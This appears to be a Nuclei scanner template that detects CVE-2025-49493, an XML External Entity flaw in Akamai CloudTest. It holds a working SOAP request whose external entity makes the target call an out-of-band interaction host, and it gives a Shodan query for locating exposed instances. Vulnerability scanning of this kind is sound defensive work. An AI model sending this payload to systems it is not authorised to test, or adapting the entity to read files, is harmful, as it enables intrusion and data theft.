http/cves/2025/CVE-2025-49493.yaml

id: CVE-2025-49493

info:
  name: Akamai CloudTest < 60 2025.06.02 - XML External Entity (XXE)
  author: xbow,3th1c_yuk1
  severity: critical
  description: |
    Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.
  reference:
    - https://xbow.com/blog/xbow-akamai-cloudtest-xxe/
    - https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes
    - https://nvd.nist.gov/vuln/detail/CVE-2025-49493
  classification:
    epss-score: 0.01101
    epss-percentile: 0.77299
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 9.1
    cve-id: CVE-2025-49493
    cwe-id: CWE-611
    cpe: cpe:2.3:a:akamai:cloudtest:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"Akamai CloudTest"
    vendor: akamai
    product: cloudtest
  tags: cve,cve2025,akamai,cloudtest,xxe,oast,rce,vkev

http:
  - raw:
      - |
        POST /concerto/services/RepositoryService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/html
        SOAPAction: ""

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE soapenv:Envelope [
          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
        ]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:rep="http://example.com/services/repository">
           <soapenv:Header/>
           <soapenv:Body>
              <rep:getUIBundleObjectXml>
                 <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
              </rep:getUIBundleObjectXml>
           </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "dns")'
          - 'contains(content_type, "text/xml")'
          - 'contains(body, "XML stream")'
        condition: and
# digest: 490a00463044022046a750cb9ce58f38745bb3f27957750812f9b019c3cc01fdf57a4b7e93d7667e02205092749e4ec4bf0979532ba9be469acac079d573c79ebfe88b4920e1f00e9f7d:922c64590222798bb761d5b6d8e72950